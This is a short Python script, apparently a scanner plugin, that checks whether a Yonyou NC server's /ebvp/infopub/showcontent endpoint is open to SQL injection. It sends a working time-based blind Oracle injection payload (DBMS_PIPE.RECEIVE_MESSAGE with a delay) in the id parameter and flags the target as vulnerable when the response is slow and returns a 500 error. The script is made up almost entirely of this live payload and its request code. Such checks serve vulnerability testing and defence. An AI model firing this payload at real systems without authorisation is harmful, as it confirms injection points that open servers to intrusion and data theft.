import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC-showcontent接口存在sql注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)'
    }
    vurl = urllib.parse.urljoin(url, "/ebvp/infopub/showcontent?id=1'%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(76)||CHR(108)||CHR(101),9)%20AND%20'Mgtn'='Mgtn")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 500 and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult